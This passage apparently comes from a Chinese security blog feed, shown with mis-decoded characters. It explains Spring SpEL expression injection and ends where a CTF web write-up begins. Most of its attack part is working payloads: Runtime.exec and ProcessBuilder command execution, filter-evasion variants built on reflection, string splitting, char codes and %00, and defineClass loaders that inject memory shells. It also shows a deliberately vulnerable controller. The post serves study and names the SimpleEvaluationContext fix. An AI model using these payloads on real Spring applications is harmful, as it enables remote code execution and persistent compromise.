ç”¨äºæ‰§è¡ŒSpElè¡¨è¾¾å¼ï¼Œå¹¶å°†å†…å®¹èµ‹å€¼ç»™å±æ€§</li><li><code>$&#123;&#125;</code> ä¸»è¦ç”¨äºåŠ è½½å¤–éƒ¨å±æ€§æ–‡ä»¶ä¸­çš„å€¼</li></ul><p>SpELå¸¸ç”¨åœ¨ä¸‰ä¸ªåœ°æ–¹ã€‚</p><ol><li><p>Valueæ³¨è§£ ï¼ˆæ³¨ï¼šè¿™ä¸ªç±»è¦é€šè¿‡ä¾èµ–æ³¨å…¥æ‰èƒ½ä½¿Valueæ³¨è§£ç”Ÿæ•ˆï¼Œç›´æ¥newå¯¹è±¡æ˜¯ä¸è¡Œçš„ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo1.bean;<br><br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Value;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.PropertySource;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><br><span class="hljs-meta">@Component</span><br><span class="hljs-meta">@PropertySource(&#123;&quot;classpath:/configure.properties&quot;&#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-meta">@Value(&quot;$&#123;spring.user.name&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> String userName; <span class="hljs-comment">// å€¼æ¥è‡ªapplication.properties</span><br>    <span class="hljs-meta">@Value(&quot;$&#123;home.dorm&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> String address; <span class="hljs-comment">// å€¼æ¥è‡ªconfigure.properties(æ”¾åœ¨resourcesæ–‡ä»¶å¤¹ä¸‹)</span><br>    <span class="hljs-meta">@Value(&quot;#&#123;T(java.lang.Math).random()&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> age;<br>    <span class="hljs-meta">@Value(&quot;#&#123;systemProperties[&#x27;os.name&#x27;]&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> String sys; <span class="hljs-comment">// æ³¨å…¥æ“ä½œç³»ç»Ÿå±æ€§</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// configure.properties</span><br>home.dorm=Room402,Unit4,Building3,No<span class="hljs-number">.34</span>.LousyLoad<br><span class="hljs-comment">// application.properti</span><br>spring.user.name=Taco<br></code></pre></td></tr></table></figure><p>è¾“å‡ºå¦‚ä¸‹ï¼š <code>User&#123;userName=&#39;Taco&#39;, address=&#39;Room402,Unit4,Building3,No.34.LousyLoad&#39;, age=0.5913714334107036, sys=&#39;Windows 10&#39;&#125;</code></p></li><li><p>XML</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;Book&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.example.bean&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;author&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;#&#123;è¡¨è¾¾å¼&#125;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>Expressionæ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">spelTest</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>    <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(<span class="hljs-string">&quot;(&#x27;Hello &#x27;+&#x27;SpEL&#x27;).concat(#end)&quot;</span>);<br>    <span class="hljs-type">EvaluationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardEvaluationContext</span>();<br>    context.setVariable(<span class="hljs-string">&quot;end&quot;</span>, <span class="hljs-string">&quot;!&quot;</span>);<br>    System.out.println(expression.getValue(context));<br>&#125;<br></code></pre></td></tr></table></figure><p>è¾“å‡º<code>Hello SpEL!</code></p></li></ol><p>å®é™…æƒ…å†µä¸‹ï¼Œä¸€èˆ¬éƒ½æ˜¯åŸºäºä¸Šé¢ç¬¬ä¸‰ç§SpELçš„ä½¿ç”¨åœºæ™¯å‡ºç°çš„æ¼æ´ã€‚ ä¸‹é¢ç®€å•åˆ†æä¸€ä¸‹SpELåœ¨æ±‚è¡¨è¾¾å¼å€¼çš„è¿‡ç¨‹</p><blockquote><p>1.åˆ›å»ºè§£æå™¨ new SpelExpressionParser() 2.è§£æè¡¨è¾¾å¼ parseExpression(your_expression) 3.æ„é€ ä¸Šä¸‹æ–‡ new StandardEvaluationContext() é»˜è®¤ä¸ºè¿™ä¸ª 4.æ±‚å€¼ expression.getValue(context)</p></blockquote><h3 id="æ¼æ´åˆ©ç”¨å‰æ"><a href="#æ¼æ´åˆ©ç”¨å‰æ" class="headerlink" title="æ¼æ´åˆ©ç”¨å‰æ"></a>æ¼æ´åˆ©ç”¨å‰æ</h3><blockquote><p>1.æœåŠ¡å™¨æ¥æ”¶ç”¨æˆ·è¾“å…¥çš„è¡¨è¾¾å¼ 2.è¡¨è¾¾å¼è§£æä¹‹åè°ƒç”¨äº†getValue 3.ä½¿ç”¨StandardEvaluationContextä½œä¸ºä¸Šä¸‹æ–‡å¯¹è±¡</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpELController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;spel&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">spel</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(name=&quot;cmd&quot;)</span>String cmd)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello SpEL!!!&quot;</span>);<br>        <span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>        <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(cmd);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> expression.getValue();<br>        <span class="hljs-keyword">return</span> obj.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ®µä»£ç ä¸­ï¼Œå¯æ³¨å…¥çš„ç‚¹åœ¨è¯·æ±‚å‚æ•°cmd è®¿é—®<code>http://localhost:8080/spel?cmd=T(java.lang.Runtime).getRuntime().exec(%27calc%27)</code> æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ã€‚</p><h3 id="æ³¨å…¥tricks"><a href="#æ³¨å…¥tricks" class="headerlink" title="æ³¨å…¥tricks"></a>æ³¨å…¥tricks</h3><p>ä¸€äº›trivialçš„payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;caslc&quot;</span>&#125;).start()<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)<br></code></pre></td></tr></table></figure><p>å‘½ä»¤æ‰§è¡Œå¸¦è¿”å›ç»“æœçš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;whoami&quot;</span>).start().getInputStream())).readLine()<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>).getInputStream(), <span class="hljs-string">&quot;GBK&quot;</span>).useDelimiter(<span class="hljs-string">&quot;xxx&quot;</span>).next()<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨jså¼•æ“å¯ä»¥å®ç°æ›´åŠ å¤æ‚çš„æ“ä½œï¼Œå¦‚æ³¨å…¥å†…å­˜é©¬</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">byte</span>[] bytes = ClassPool.getDefault().get(<span class="hljs-string">&quot;EvilInterceptor&quot;</span>).toBytecode();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(bytes);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&#x27;js&#x27;).eval(\&quot;&quot;</span> + makeJsDefinedClass(<span class="hljs-string">&quot;EvilInterceptor&quot;</span>, s) + <span class="hljs-string">&quot;\&quot;)&quot;</span>;<br>    System.out.println(cmd);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">makeJsDefinedClass</span><span class="hljs-params">(String classname, String encoded)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;var data = &#x27;&quot;</span> + encoded + <span class="hljs-string">&quot;&#x27;;&quot;</span> +<br>        <span class="hljs-string">&quot;var bytes = java.util.Base64.getDecoder().decode(data);&quot;</span> +<br>        <span class="hljs-string">&quot;var cls = java.lang.Class.forName(&#x27;sun.nio.ch.Util&#x27;);&quot;</span> +<br>        <span class="hljs-string">&quot;var method = cls.getDeclaredMethod(&#x27;unsafe&#x27;);&quot;</span> +<br>        <span class="hljs-string">&quot;method.setAccessible(true);&quot;</span> +<br>        <span class="hljs-string">&quot;var unsafe = method.invoke(cls);&quot;</span> +<br>        <span class="hljs-string">&quot;var classLoader = java.lang.Thread.currentThread().getContextClassLoader();&quot;</span> +<br>        <span class="hljs-string">&quot;var evil = unsafe.defineClass(&#x27;&quot;</span> + classname + <span class="hljs-string">&quot;&#x27;, bytes, 0, bytes.length, classLoader, null);&quot;</span> +<br>        <span class="hljs-string">&quot;evil.newInstance();&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œåˆ©ç”¨çš„æ˜¯<code>Unsafe</code>å»<code>defineClass</code>åŠ è½½å­—èŠ‚ç </p><p>å®é™…ä¸ŠSpringæ¡†æ¶ä¸­<code>org.springframework.cglib.core.ReflectUtils</code>å°±æä¾›äº†ä¸€ç³»åˆ—åå°„æœ‰å…³çš„æ–¹æ³•ï¼Œå…¶ä¸­å°±åŒ…æ‹¬äº†å­—èŠ‚ç åŠ è½½<code>defineClass</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] bytes = ClassPool.getDefault().get(<span class="hljs-string">&quot;EvilInterceptor&quot;</span>).toBytecode();<br><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(bytes);<br><span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;EvilInterceptor&#x27;,T(org.springframework.util.Base64Utils).decodeFromString(&#x27;&quot;</span> + s + <span class="hljs-string">&quot;&#x27;),T(java.lang.Thread).currentThread().getContextClassLoader()).newInstance()&quot;</span>;<br>System.out.println(cmd);<br></code></pre></td></tr></table></figure><p>é«˜ç‰ˆæœ¬JDKï¼ˆ&gt;&#x3D;9ï¼‰å¼•å…¥äº†å‘½åæ¨¡å—æœºåˆ¶ï¼Œ<code>java.*</code>ä¸‹çš„éå…¬å¼€å˜é‡å’Œæ–¹æ³•ä¸èƒ½è¢«å…¶ä»–æ¨¡å—ç›´æ¥è®¿é—®ï¼ŒJDK11è¿˜åªä¼šæç¤ºwarningï¼Œè€Œåœ¨JDK17ä¸­ä¼šå¼ºåˆ¶å¼€å¯ï¼Œç›´æ¥æŠ¥é”™</p><p>ä¸Šé¢çš„payloadæ‰§è¡Œåä¼šæŠ¥é”™</p><blockquote><p>java.lang.reflect.InaccessibleObjectException: Unable to make protected final java.lang.Class java.lang.ClassLoader.defineClass(java.lang.String,byte[],int,int,java.security.ProtectionDomain) throws java.lang.ClassFormatError accessible: module java.base does not â€œopens java.langâ€ to unnamed module @635eaaf1</p></blockquote><p><img src="/2024/08/22/El-Spel/image-20240822154752676.png" alt="image-20240822154752676"></p><p><code>java.lang.ClassLoader#defineClass</code>ä¸æ˜¯å…¬å¼€æ–¹æ³•ï¼Œæ— æ³•è¢«å…¶ä»–æ¨¡å—è®¿é—®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] bytes = ClassPool.getDefault().get(<span class="hljs-string">&quot;org.springframework.expression.EvilInterceptor&quot;</span>).toBytecode();<br><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(bytes);<br><span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;org.springframework.expression.EvilInterceptor&#x27;,T(java.util.Base64).getDecoder().decode(&#x27;&quot;</span> + s + <span class="hljs-string">&quot;&#x27;),T(java.lang.Thread).currentThread().getContextClassLoader(), null, T(java.lang.Class).forName(&#x27;org.springframework.expression.ExpressionParser&#x27;))&quot;</span>;<br>System.out.println(cmd);<br></code></pre></td></tr></table></figure><h3 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h3><p><code>SimpleEvaluationContext</code>ã€<code>StandardEvaluationContext</code> æ˜¯ SpELæä¾›çš„ä¸¤ä¸ª <code>EvaluationContext</code></p><p><code>SimpleEvaluationContext</code> æ—¨åœ¨ä»…æ”¯æŒ SpEL è¯­è¨€è¯­æ³•çš„ä¸€ä¸ªå­é›†ã€‚å®ƒä¸åŒ…æ‹¬ Java ç±»å‹å¼•ç”¨ï¼Œæ„é€ å‡½æ•°å’Œ bean å¼•ç”¨</p><p>ç”¨<code>SimpleEvaluationContext</code>æ›¿æ¢é»˜è®¤çš„<code>StandardEvaluationContext</code>ï¼Œå°±èƒ½æœ‰æ•ˆé˜²æ­¢æ¶æ„SpELè¡¨è¾¾å¼çš„æ‰§è¡Œã€‚</p><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p><strong>åå°„</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">T(String).getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)<br><span class="hljs-comment">// åŒä¸Šï¼Œéœ€è¦æœ‰ä¸Šä¸‹æ–‡ç¯å¢ƒ</span><br>#<span class="hljs-built_in">this</span>.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>)<br><span class="hljs-comment">// åå°„è°ƒç”¨+å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œç»•è¿‡æ­£åˆ™è¿‡æ»¤</span><br>T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;ex&quot;</span>+<span class="hljs-string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRu&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)),<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/C&quot;</span>,<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br><span class="hljs-comment">// åŒä¸Šï¼Œéœ€è¦æœ‰ä¸Šä¸‹æ–‡ç¯å¢ƒ</span><br>#<span class="hljs-built_in">this</span>.getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;ex&quot;</span>+<span class="hljs-string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRu&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)),<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/C&quot;</span>,<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br></code></pre></td></tr></table></figure><p><strong>å­—ç¬¦ç¼–ç </strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Stringç±»åŠ¨æ€ç”Ÿæˆå­—ç¬¦</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.String(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">99</span>,<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">99</span>&#125;)).start()<br><span class="hljs-comment">// charè½¬å­—ç¬¦ä¸²ï¼Œå†å­—ç¬¦ä¸²concat</span><br>T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(<span class="hljs-number">99</span>).concat(T(java.lang.Character).toString(<span class="hljs-number">97</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">108</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">99</span>)))<br></code></pre></td></tr></table></figure><p><strong>å­—ç¬¦ä¸²æ‹¼æ¥</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;ex&quot;</span>+<span class="hljs-string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRu&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)),<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/C&quot;</span>,<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br></code></pre></td></tr></table></figure><p><strong>JavaScriptå¼•æ“</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="hljs-string">&quot;nashorn&quot;</span>).eval(<span class="hljs-string">&quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/C&#x27;;s[2]=&#x27;calc&#x27;;java.la&quot;</span>+<span class="hljs-string">&quot;ng.Run&quot;</span>+<span class="hljs-string">&quot;time.getRu&quot;</span>+<span class="hljs-string">&quot;ntime().ex&quot;</span>+<span class="hljs-string">&quot;ec(s);&quot;</span>)T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="hljs-string">&quot;JavaScript&quot;</span>).eval(<span class="hljs-string">&quot;xxx&quot;</span>),)<br></code></pre></td></tr></table></figure><p><strong>ç»•è¿‡T( è¿‡æ»¤</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//%00ä¼šè¢«ç›´æ¥æ›¿æ¢ä¸ºç©º</span><br>T%<span class="hljs-number">00</span>(<span class="hljs-keyword">new</span>)<br></code></pre></td></tr></table></figure><p><strong>ç»•è¿‡getClass(è¿‡æ»¤</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&#x27;&#x27;</span>.getClass æ›¿æ¢ä¸º <span class="hljs-string">&#x27;&#x27;</span>.class.getSuperclass().class<br><span class="hljs-string">&#x27;&#x27;</span>.class.getSuperclass().class.forName(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getDeclaredMethods()[<span class="hljs-number">14</span>].invoke(<span class="hljs-string">&#x27;&#x27;</span>.class.getSuperclass().class.forName(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getDeclaredMethods()[<span class="hljs-number">7</span>].invoke(<span class="hljs-literal">null</span>),<span class="hljs-string">&#x27;calc&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>ä½¿ç”¨Springå·¥å…·ç±»ï¼Œå¯æ‰“å†…å­˜é©¬</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ååºåˆ—åŒ–</span><br>T(org.springframework.util.SerializationUtils).deserialize(T(com.sun.org.apache.xml.internal.security.utils.Base64).decode(<span class="hljs-string">&#x27;rO0AB...&#x27;</span>))<br><span class="hljs-comment">// æ‰§è¡Œè‡ªå®šä¹‰ç±»çš„é™æ€ä»£ç å—</span><br>T(org.springframework.cglib.core.ReflectUtils).defineClass(<span class="hljs-string">&#x27;Singleton&#x27;</span>,T(com.sun.org.apache.xml.internal.security.utils.Base64).decode(<span class="hljs-string">&#x27;yv66vgAAADIAtQ....&#x27;</span>),T(org.springframework.util.ClassUtils).getDefaultClassLoader())<br></code></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><p><a href="https://www.cnblogs.com/bitterz/p/15206255.html">https://www.cnblogs.com/bitterz/p/15206255.html</a></p><p><a href="https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf">https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf</a></p><p><a href="https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection">https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection</a><br><a href="http://www.cnblogs.com/bitterz/p/15206255.html">www.cnblogs.com/bitterz/p/15206255.html</a></p><p><a href="https://blog.csdn.net/weixin_43610673/article/details/125941767?spm=1001.2014.3001.5501">Javawebå®‰å…¨â€”â€”è¡¨è¾¾å¼æ³¨å…¥ï¼ˆEL+SpELï¼‰-CSDNåšå®¢</a></p><p><a href="https://p4d0rn.gitbook.io/java/others/spel">Spel Attack | Java (gitbook.io)</a></p><p><a href="https://p4d0rn.gitbook.io/java/others/elattack">El Attack | Java (gitbook.io)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å·…å³°æå®¢2024-åˆèµ›-web-éƒ¨åˆ†wp</title>
    <link href="/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024-%E5%88%9D%E8%B5%9B-web-%E9%83%A8%E5%88%86wp/"/>
    <url>/2024/08/17/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024-%E5%88%9D%E8%B5%9B-web-%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<p>å¯æƒœã€‚</p><p>ä¸å¤šè¯´äº†ï¼Œçœ‹çœ‹å§ã€‚</p><h2 id="php-online"><a href="#php-online" class="headerlink" title="php_online"></a>php_online</h2><p>å®¡è®¡ä¸€ä¸‹æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, session, redirect, url_for, render_template<br><span 